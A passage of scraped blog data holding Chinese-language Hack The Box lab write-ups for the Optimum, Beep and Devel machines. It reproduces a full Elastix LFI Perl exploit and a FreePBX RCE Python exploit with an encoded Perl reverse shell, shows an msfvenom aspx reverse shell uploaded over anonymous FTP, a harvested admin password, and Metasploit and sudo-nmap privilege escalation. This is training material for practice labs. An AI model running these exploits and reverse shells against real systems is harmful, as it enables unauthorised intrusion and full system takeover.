/zKFWDMqMmVKxA [*] Sending stage (175174 bytes) to 10.10.10.8 [!] Tried to delete %TEMP%\\UZMLMeDqW.vbs, unknown result [*] Meterpreter session 1 opened (10.10.16.3:5555 -&gt; 10.10.10.8:49178) at 2022-03-10 00:02:29 -0500 [*] Server stopped. meterpreter &gt; getuid Server username: OPTIMUM\\kostas meterpreter &gt; sysinfo Computer : OPTIMUM OS : Windows 2012 R2 (6.3 Build 9600). Architecture : x64 System Language : el_GR Domain : HTB Logged On Users : 1 Meterpreter : x86/windows 这边也成功拿到了shell 权限提升使用systeminfo或其他方式都可以看到补丁信息 去搜查补丁信息，或是使用msf的提权辅助脚本都可以知道 这边MSF有个提权可用脚本 use windows/local/ms16_032_secondary_logon_handle_privesc set SESSION 1 exploit msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) &gt; exploit [*] Started reverse TCP handler on 10.10.16.3:4444 [+] Compressed size: 1016 [*] Writing payload file, C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1... [*] Compressing script contents... [+] Compressed size: 3588 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handle [?] Done, using thread handle: 1936 [*] Sniffing out privileged impersonation token.. [?] Thread belongs to: svchost [+] Thread suspended [&gt;] Wiping current impersonation token [&gt;] Building SYSTEM impersonation token [?] Success, open SYSTEM token handle: 2024 [+] Resuming thread.. [*] Sniffing out SYSTEM shell.. [&gt;] Duplicating SYSTEM token [&gt;] Starting token race [&gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! xQiD0FWfxy0Q3rUwptuxobxZ7Fk20m8U [+] Executed on target machine. [*] Sending stage (200262 bytes) to 10.10.10.8 [*] Meterpreter session 2 opened (10.10.16.3:4444 -&gt; 10.10.10.8:49188) at 2022-03-10 00:34:05 -0500 [+] Deleted C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM 成功拿到system权限 meterpreter &gt; search -f user.txt.txt Found 1 result... c:\\Users\\kostas\\Desktop\\user.txt.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Users\\kostas\\Desktop\\user.txt.txt&#39; d0c39409d7b994a9a1389ebf38ef5f73 meterpreter &gt; search -f root.txt Found 1 result... c:\\Users\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Users\\Administrator\\Desktop\\root.txt&#39; 51ed1b36553c8461f4552c2e92b3eeed 成功拿到user和root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Beep - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Beep","date":"2022-03-09T11:38:36.000Z","updated":"2023-06-13T03:40:46.000Z","comments":true,"path":"2022/03/09/Hackthebox/Easy/Hackthebox-Beep/","link":"","permalink":"http://www.lucifiel.com/2022/03/09/Hackthebox/Easy/Hackthebox-Beep/","excerpt":"","text":"Hackthebox - Beep靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.7 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-04 00:36 EST Nmap scan report for 10.10.10.7 Host is up (6.6s latency). Not shown: 64293 filtered ports, 1232 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) |_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) 25/tcp open tcpwrapped |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 80/tcp open tcpwrapped |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ 110/tcp open tcpwrapped |_pop3-capabilities: STLS PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) TOP UIDL USER AUTH-RESP-CODE APOP 111/tcp open tcpwrapped | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open tcpwrapped |_imap-capabilities: THREAD=ORDEREDSUBJECT NAMESPACE OK MULTIAPPEND X-NETSCAPE QUOTA NO URLAUTHA0001 LISTEXT LIST-SUBSCRIBED CATENATE BINARY ID IDLE RIGHTS=kxte ANNOTATEMORE STARTTLS IMAP4 SORT=MODSEQ Completed IMAP4rev1 ACL UNSELECT RENAME UIDPLUS ATOMIC THREAD=REFERENCES MAILBOX-REFERRALS LITERAL+ CONDSTORE SORT CHILDREN 443/tcp open tcpwrapped | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2022-03-04T06:40:08+00:00; +59m59s from scanner time. 993/tcp open tcpwrapped |_imap-capabilities: CAPABILITY 995/tcp open tcpwrapped 3306/tcp open tcpwrapped |_sslv2: ERROR: Script execution failed (use -d to debug) Device type: firewall Running (JUST GUESSING): Fortinet embedded (87%) OS CPE: cpe:/h:fortinet:fortigate_100d Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 4 hops Host script results: |_clock-skew: 59m55s TRACEROUTE (using port 8888/tcp) HOP RTT ADDRESS 1 5559.01 ms 10.10.16.1 2 ... 3 4 5559.05 ms 10.10.10.7 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 460.47 seconds Http先来看看80端口的web服务 是一个Elastix的系统，去搜搜看是否有漏洞 ┌──(root💀kali)-[~/Desktop] └─# searchsploit elastix ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Elastix - &#39;page&#39; Cross-Site Scripting | php/webapps/38078.py Elastix - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/38544.txt Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/34942.txt Elastix 2.2.0 - &#39;graph.php&#39; Local File Inclusion | php/webapps/37637.pl Elastix 2.x - Blind SQL Injection | php/webapps/36305.txt Elastix &lt; 2.5 - PHP Code Injection | php/webapps/38091.php FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 这里可以看到有几个漏洞，其中一个是LFI（远程文件包含），去看看相关漏洞内容 ┌──(root💀kali)-[~/Desktop] └─# locate php/webapps/37637.pl /usr/share/exploitdb/exploits/php/webapps/37637.pl ┌──(root💀kali)-[~/Desktop] └─# cat /usr/share/exploitdb/exploits/php/webapps/37637.pl source: https://www.securityfocus.com/bid/55078/info Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input. An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks. Elastix 2.2.0 is vulnerable; other versions may also be affected. #!/usr/bin/perl -w #------------------------------------------------------------------------------------# #Elastix is an Open Source Sofware to establish Unified Communications. #About this concept, Elastix goal is to incorporate all the communication alternatives, #available at an enterprise level, into a unique solution. #------------------------------------------------------------------------------------# ############################################################ # Exploit Title: Elastix 2.2.0 LFI # Google Dork: :( # Author: cheki # Version:Elastix 2.2.0 # Tested on: multiple # CVE : notyet # romanc-_-eyes ;) # Discovered by romanc-_-eyes # vendor http://www.elastix.org/ print &quot;\\t Elastix 2.2.0 LFI Exploit \\n&quot;; print &quot;\\t code author cheki \\n&quot;; print &quot;\\t 0day Elastix 2.2.0 \\n&quot;; print &quot;\\t email: anonymous17hacker{}gmail.com \\n&quot;; #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action use LWP::UserAgent; print &quot;\\n Target: https://ip &quot;; chomp(my $target=&lt;STDIN&gt;); $dir=&quot;vtigercrm&quot;; $poc=&quot;current_language&quot;; $etc=&quot;etc&quot;; $jump=&quot;../../../../../../../..//&quot;; $test=&quot;amportal.conf%00&quot;; $code = LWP::UserAgent-&gt;new() or die &quot;inicializacia brauzeris\\n&quot;; $code-&gt;agent(&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#39;); $host = $target . &quot;/&quot;.$dir.&quot;/graph.php?&quot;.$poc.&quot;=&quot;.$jump.&quot;&quot;.$etc.&quot;/&quot;.$test.&quot;&amp;module=Accounts&amp;action&quot;; $res = $code-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host)); $answer = $res-&gt;content; if ($answer =~ &#39;This file is part of FreePBX&#39;) { print &quot;\\n read amportal.conf file : $answer \\n\\n&quot;; print &quot; successful read\\n&quot;; } else { print &quot;\\n[-] not successful\\n&quot;; } 漏洞利用根据Exploit中提到的，构造一个任意文件读取的Payload view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action 成功读取到一个账号密码 username = admin password = jEhdIekWmdjE 我们去尝试登录一下 登入后似乎是一个仪表盘，但没什么可以利用的 经过尝试后发现&#x2F;admin目录是一个另外的登录口，也可使用这个账号密码进行登录 但登入后也没看到什么明显的利用点 这边倒是可以直接使用ssh进行登录，先给大家演示一下直接登录的方法，再演示其他的利用方式 ┌──(root💀kali)-[~/Desktop] └─# ssh root@10.10.10.7 Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 这边提示需要指定kex算法，去指定一下 ┌──(root💀kali)-[~/Desktop] └─# ssh root@10.10.10.7 -o KexAlgorithms=diffie-hellman-group1-sha1 255 ⨯ The authenticity of host &#39;10.10.10.7 (10.10.10.7)&#39; can&#39;t be established. RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.7&#39; (RSA) to the list of known hosts. root@10.10.10.7&#39;s password: Last login: Tue Jul 16 11:45:47 2019 Welcome to Elastix ---------------------------------------------------- To access your Elastix System, using a separate workstation (PC/MAC/Linux) Open the Internet Browser using the following URL: http://10.10.10.7 [root@beep ~]# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 可以直接使用网页中获取到的密码进行登录，不过这种猜密码是否可以利用的方式显然不符合我的想法，还是得测试漏洞 进入https://10.10.10.7/admin然后取消登录框，即可看到FreePBX的版本，去searchspolit一下 ┌──(root💀kali)-[~/Desktop] └─# searchsploit FreePBX ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- FreePBX - &#39;config.php&#39; Remote Code Execution (Metasploit) | unix/remote/32512.rb FreePBX 13 - Remote Command Execution / Privilege Escalation | php/webapps/40614.py FreePBX 13.0.35 - Remote Command Execution | php/webapps/40296.txt FreePBX 13.0.35 - SQL Injection | php/webapps/40312.txt FreePBX 13.0.x &lt; 13.0.154 - Remote Command Execution | php/webapps/40345.txt FreePBX 13/14 - Remote Command Execution / Privilege Escalation | linux/remote/40232.py FreePBX 2.1.3 - &#39;upgrade.php&#39; Remote File Inclusion | php/webapps/2665.txt FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py FreePBX 2.11.0 - Remote Command Execution | php/webapps/32214.pl FreePBX 2.2 - SIP Packet Multiple HTML Injection Vulnerabilities | multiple/remote/29873.php FreePBX 2.5.1 - SQL Injection | multiple/webapps/11186.txt FreePBX 2.5.2 - &#39;/admin/config.php?tech&#39; Cross-Site Scripting | php/webapps/33442.txt FreePBX 2.5.2 - Zap Channel Addition Description Parameter Cross-Site Scripting | php/webapps/33443.txt FreePBX 2.5.x - Information Disclosure | multiple/webapps/11187.txt FreePBX 2.5.x &lt; 2.6.0 - Persistent Cross-Site Scripting | multiple/webapps/11184.txt FreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution | php/webapps/15098.txt FreePBX 2.9.0/2.10.0 - &#39;callmenum&#39; Remote Code Execution (Metasploit) | php/webapps/18659.rb FreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities | php/webapps/18649.txt FreePBX &lt; 13.0.188 - Remote Command Execution (Metasploit) | php/remote/40434.rb Freepbx &lt; 2.11.1.5 - Remote Code Execution | php/webapps/41005.txt ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 这里可以看到有一个RCE的漏洞 php&#x2F;webapps&#x2F;18650.py 咱们去查看一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep] └─# cat exploit.py #!/usr/bin/python ############################################################ # Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit # Google Dork: oy vey # Date: March 23rd, 2012 # Author: muts # Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others. # Tested on: multiple # CVE : notyet # Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ # Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt ############################################################ # Discovered by Martin Tschirsich # http://seclists.org/fulldisclosure/2012/Mar/234 # http://www.exploit-db.com/exploits/18649 ############################################################ import urllib rhost=&quot;172.16.254.72&quot; lhost=&quot;172.16.254.223&quot; lport=443 extension=&quot;1000&quot; # Reverse shell payload url = &#39;https://&#39;+str(rhost)+&#39;/recordings/misc/callme_page.php?action=c&amp;callmenum=&#39;+str(extension)+&#39;@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22&#39;+str(lhost)+&#39;%3a&#39;+str(lport)+&#39;%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&#39; urllib.urlopen(url) # On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h &lt;enter&gt; for help # nmap&gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 稍微做一下修改 rhost=&quot;10.10.10.7&quot; lhost=&quot;10.10.16.2&quot; lport=4444 extension=&quot;1000&quot; 修改好以后去执行试试 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep] └─# python exploit.py Traceback (most recent call last): File &quot;exploit.py&quot;, line 27, in &lt;module&gt; urllib.urlopen(url) File &quot;/usr/lib/python2.7/urllib.py&quot;, line 87, in urlopen return opener.open(url) File &quot;/usr/lib/python2.7/urllib.py&quot;, line 215, in open return getattr(self, name)(url) File &quot;/usr/lib/python2.7/urllib.py&quot;, line 445, in open_https h.endheaders(data) File &quot;/usr/lib/python2.7/httplib.py&quot;, line 1078, in endheaders self._send_output(message_body) File &quot;/usr/lib/python2.7/httplib.py&quot;, line 894, in _send_output self.send(msg) File &quot;/usr/lib/python2.7/httplib.py&quot;, line 856, in send self.connect() File &quot;/usr/lib/python2.7/httplib.py&quot;, line 1303, in connect server_hostname=server_hostname) File &quot;/usr/lib/python2.7/ssl.py&quot;, line 369, in wrap_socket _context=self) File &quot;/usr/lib/python2.7/ssl.py&quot;, line 599, in __init__ self.do_handshake() File &quot;/usr/lib/python2.7/ssl.py&quot;, line 828, in do_handshake self._sslobj.do_handshake() IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727) 这边urllib报错了，想个办法，给删掉改成print输出手动执行试试 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep] └─# python exploit.py https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A 去浏览器里访问一下 去访问后这一段没有弹回shell，去找一下原因 排查后发现应该是extension的问题，去查找一下正确的extension ┌──(root💀kali)-[~/Desktop] └─# svwar -m INVITE -e200-300 10.10.10.7 WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag WARNING:TakeASip:extension &#39;239&#39; probably exists but the response is unexpected WARNING:TakeASip:extension &#39;241&#39; probably exists but the response is unexpected ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ | 239 | weird | +-----------+----------------+ | 241 | weird | +-----------+----------------+ 正确的是233，咱们去exploit里修改一下，然后重新生成 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep] └─# python exploit.py https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A 再去试试 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 46340 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; bash-3.2$ whoami&amp;&amp;id whoami&amp;&amp;id asterisk uid=100(asterisk) gid=101(asterisk) 成功拿到user权限 bash-3.2$ cd /home cd /home bash-3.2$ ls ls fanis spamfilter bash-3.2$ cd fanis cd fanis bash-3.2$ ls ls user.txt bash-3.2$ cat user.txt cat user.txt e6da504f44f4d004da91498eec298b24 成功拿到user权限的flag文件 权限提升# On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h &lt;enter&gt; for help # nmap&gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 按照exploit里提示的进行提权试试 bash-3.2$ sudo nmap --interactive sudo nmap --interactive Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h &lt;enter&gt; for help nmap&gt; !sh !sh sh-3.2# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 成功拿到root权限 sh-3.2# cd /root cd /root sh-3.2# ls ls anaconda-ks.cfg install.log.syslog webmin-1.570-1.noarch.rpm elastix-pr-2.2-1.i386.rpm postnochroot install.log root.txt sh-3.2# cat root.txt cat root.txt 493be6af70ce6780ee96432618649fe4 成功拿到root权限的flag文件 咱们看一下原理 sh-3.2# sudo -l sudo -l Matching Defaults entries for root on this host: env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot; User root may run the following commands on this host: (ALL) ALL 这里可以执行的权限还挺多的","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Devel - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Devel","date":"2022-03-03T11:38:36.000Z","updated":"2023-06-13T03:42:50.000Z","comments":true,"path":"2022/03/03/Hackthebox/Easy/Hackthebox-Devel/","link":"","permalink":"http://www.lucifiel.com/2022/03/03/Hackthebox/Easy/Hackthebox-Devel/","excerpt":"","text":"Hackthebox - Devel靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Devel] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.5 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-03 02:16 EST Nmap scan report for 10.10.10.5 Host is up (0.70s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM &lt;DIR&gt; aspnet_client | 03-17-17 04:37PM 689 iisstart.htm |_03-17-17 04:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2 Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 934.01 ms 10.10.16.1 2 934.05 ms 10.10.10.5 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.29 seconds Http先去看看80端口的web服务 就是一个普通的IIS页面，没什么可看的 FTPFTP可以看到有两个文件，并且可以匿名登录 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Devel] └─# ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 01:06AM &lt;DIR&gt; aspnet_client 03-17-17 04:37PM 689 iisstart.htm 03-17-17 04:37PM 184946 welcome.png 226 Transfer complete. 这里看到两个文件，似乎和80端口的是一样的 去本地创建个文件传上去试试 ┌──(root💀kali)-[~/Desktop] └─# echo &quot;I&#39;m Lucifiel&quot; &gt; test.html ┌──(root💀kali)-[~/Desktop] └─# ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; put test.html local: test.html remote: test.html 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 14 bytes sent in 0.00 secs (303.8194 kB/s) ftp&gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 01:06AM &lt;DIR&gt; aspnet_client 03-17-17 04:37PM 689 iisstart.htm 03-03-22 09:29AM 14 test.html 03-17-17 04:37PM 184946 welcome.png 226 Transfer complete. 成功传上去了，咱们去访问看看有没有 ┌──(root💀kali)-[~/Desktop] └─# curl http://10.10.10.5/test.html I&#39;m Lucifiel OK，传上去了，证明猜想没错，那就简单了，去生成个马传上去吧 漏洞利用┌──(root💀kali)-[~/Desktop] └─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f aspx -o shell.aspx [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of aspx file: 2901 bytes Saved as: shell.aspx 使用msf生成一个aspx的木马 ┌──(root💀kali)-[~/Desktop] └─# ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; put shell.aspx local: shell.aspx remote: shell.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 2938 bytes sent in 0.00 secs (58.3728 MB/s) 然后使用ftp传上去 msf6 &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf6 &gt; use exploit/multi/handler [*] Using configured payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) &gt; set lhost 10.10.16.2 lhost =&gt; 10.10.16.2 msf6 exploit(multi/handler) &gt; set lport 4444 lport =&gt; 4444 msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 然后使用msf开启端口监听 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Devel] └─# curl http://10.10.10.5/shell.aspx 然后访问我们上传的aspx马 msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.5:49162) at 2022-03-03 02:37:15 -0500 meterpreter &gt; getuid Server username: IIS APPPOOL\\Web meterpreter &gt; sysinfo Computer : DEVEL OS : Windows 7 (6.1 Build 7600). Architecture : x86 System Language : el_GR Domain : HTB Logged On Users : 2 Meterpreter : x86/windows 成功拿到shell 权限提升meterpreter &gt; background [*] Backgrounding session 1... msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester [*] Using configured payload windows/meterpreter/reverse_tcp msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1 session =&gt; 1 msf6 post(multi/recon/local_exploit_suggester) &gt; exploit [*] 10.10.10.5 - Collecting local exploits for x86/windows... [*] 10.10.10.5 - 38 exploit checks are being tried... [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/tokenmagic: The target appears to be vulnerable. 